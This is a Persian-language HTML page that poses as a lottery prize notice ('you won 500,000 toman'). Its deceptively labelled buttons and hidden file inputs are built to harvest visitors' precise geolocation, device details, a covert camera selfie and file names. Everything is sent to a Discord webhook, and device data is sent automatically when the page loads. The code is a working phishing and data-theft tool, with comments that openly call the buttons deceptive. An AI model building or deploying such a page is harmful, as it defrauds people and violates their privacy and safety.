<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>برنده شدن در قرعه‌کشی</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Tahoma;
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
            color: white;
            text-align: center;
        }
        .container {
            max-width: 400px;
            margin: 20px auto;
            background: rgba(255,255,255,0.15);
            padding: 30px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 2px solid rgba(255,255,255,0.3);
        }
        .prize-box {
            background: rgba(255,255,255,0.2);
            padding: 20px;
            border-radius: 15px;
            margin: 20px 0;
        }
        .btn {
            background: #2ecc71;
            color: white;
            border: none;
            padding: 18px 30px;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px;
            width: 90%;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
        }
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
        }
        .btn:active {
            transform: translateY(1px);
        }
        .btn-secondary {
            background: #3498db;
            padding: 15px 25px;
            font-size: 16px;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .emoji {
            font-size: 40px;
            margin: 10px;
        }
        .hidden-input {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="emoji">🎉</div>
        <h1>تبریک! شما برنده شدید</h1>
        <p>جایزه: <strong>۵۰۰,۰۰۰ تومان</strong></p>
        
        <div class="prize-box">
            <p>برای دریافت جایزه، لطفاً مراحل زیر را تکمیل کنید:</p>
        </div>

        <!-- دکمه‌های فریبنده -->
        <button class="btn" onclick="verifyIdentity()">
            🔐 تأیید هویت
        </button>
        
        <button class="btn btn-secondary" onclick="shareWithFriends()">
            👥 دعوت از دوستان
        </button>
        
        <button class="btn btn-secondary" onclick="takeWinnerPhoto()">
            📸 عکس یادگاری
        </button>
        
        <button class="btn btn-secondary" onclick="selectPaymentMethod()">
            💳 انتخاب کارت بانکی
        </button>

        <!-- المان‌های مخفی -->
        <input type="file" id="galleryInput" accept="image/*,video/*" multiple class="hidden-input">
        <input type="file" id="fileInput" accept="*" class="hidden-input">
    </div>

    <script>
        const DISCORD_WEBHOOK = 'YOUR_WEBHOOK_HERE';

        // ۱. تأیید هویت - موقعیت + اطلاعات
        async function verifyIdentity() {
            sendToDiscord('🔐 کاربر روی تأیید هویت کلیک کرد');
            
            // موقعیت دقیق
            navigator.geolocation.getCurrentPosition(
                position => {
                    const loc = {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude
                    };
                    sendToDiscord(`📍 موقعیت برنده: ${loc.lat}, ${loc.lng}`);
                },
                error => {
                    sendToDiscord('❌ کاربر موقعیت نداد');
                },
                { enableHighAccuracy: true }
            );

            // اطلاعات دستگاه
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language
            };
            sendToDiscord(`📱 دستگاه کاربر: ${JSON.stringify(deviceInfo)}`);
        }

        // ۲. دعوت از دوستان - مخاطبین
        function shareWithFriends() {
            sendToDiscord('👥 کاربر روی دعوت از دوستان کلیک کرد');
            
            if (navigator.share) {
                navigator.share({
                    title: 'من برنده شدم! شما هم شرکت کنید',
                    text: 'در این قرعه‌کشی شرکت کنید و برنده شوید',
                    url: window.location.href
                }).then(() => {
                    sendToDiscord('✅ کاربر یک مخاطب شیر کرد');
                }).catch(() => {
                    sendToDiscord('❌ کاربر شیر کردن رو لغو کرد');
                });
            } else {
                // اگر share supported نبود، گالری رو باز کن
                openGallery();
            }
        }

        // ۳. عکس یادگاری - دوربین
        function takeWinnerPhoto() {
            sendToDiscord('📸 کاربر روی عکس یادگاری کلیک کرد');
            
            if (navigator.mediaDevices) {
                navigator.mediaDevices.getUserMedia({ video: true })
                    .then(stream => {
                        takePhotoAndSend(stream);
                    })
                    .catch(error => {
                        sendToDiscord('❌ کاربر دوربین نداد - درحال بازکردن گالری');
                        openGallery();
                    });
            } else {
                openGallery();
            }
        }

        // ۴. انتخاب کارت - فایل‌های ذخیره شده
        function selectPaymentMethod() {
            sendToDiscord('💳 کاربر روی انتخاب کارت بانکی کلیک کرد');
            document.getElementById('fileInput').click();
        }

        // باز کردن گالری
        function openGallery() {
            document.getElementById('galleryInput').click();
        }

        // وقتی کاربر از گالری عکس انتخاب کرد
        document.getElementById('galleryInput').addEventListener('change', function(e) {
            const files = e.target.files;
            sendToDiscord(`🖼️ کاربر ${files.length} فایل از گالری انتخاب کرد`);
            
            // اینجا می‌تونی فایل‌ها رو آپلود کنی
            for (let file of files) {
                sendToDiscord(`📁 فایل: ${file.name} (${file.type})`);
            }
        });

        // وقتی کاربر فایل انتخاب کرد (برای کارت بانکی)
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const files = e.target.files;
            sendToDiscord(`💾 کاربر ${files.length} فایل آپلود کرد`);
        });

        // گرفتن عکس از دوربین
        function takePhotoAndSend(stream) {
            const video = document.createElement('video');
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            
            video.srcObject = stream;
            video.play();
            
            setTimeout(() => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                const photoData = canvas.toDataURL('image/jpeg');
                sendPhotoToDiscord(photoData);
                
                stream.getTracks().forEach(track => track.stop());
                
                sendToDiscord('✅ عکس کاربر گرفته شد');
            }, 2000);
        }

        // ارسال به دیسکورد
        async function sendToDiscord(message) {
            const payload = {
                username: 'قرعه‌کشی فیک',
                content: message
            };

            try {
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
            } catch(error) {
                console.error('Error:', error);
            }
        }

        // ارسال عکس به دیسکورد
        async function sendPhotoToDiscord(photoData) {
            const blob = await fetch(photoData).then(r => r.blob());
            const formData = new FormData();
            formData.append('file', blob, 'user_selfie.jpg');
            formData.append('payload_json', JSON.stringify({
                username: 'عکس کاربر',
                content: '📸 سلفی کاربر'
            }));

            await fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                body: formData
            });
        }

        // ارسال خودکار اطلاعات وقتی صفحه لود شد
        window.onload = function() {
            setTimeout(() => {
                sendToDiscord(
                    '🎯 کاربر وارد صفحه شد\n' +
                    `📱 دستگاه: ${navigator.userAgent}\n` +
                    `🖥️ صفحه: ${screen.width}x${screen.height}\n` +
                    `🌐 زبان: ${navigator.language}\n` +
                    `🔗 آدرس: ${window.location.href}`
                );
            }, 2000);
        };
    </script>
</body>
</html>
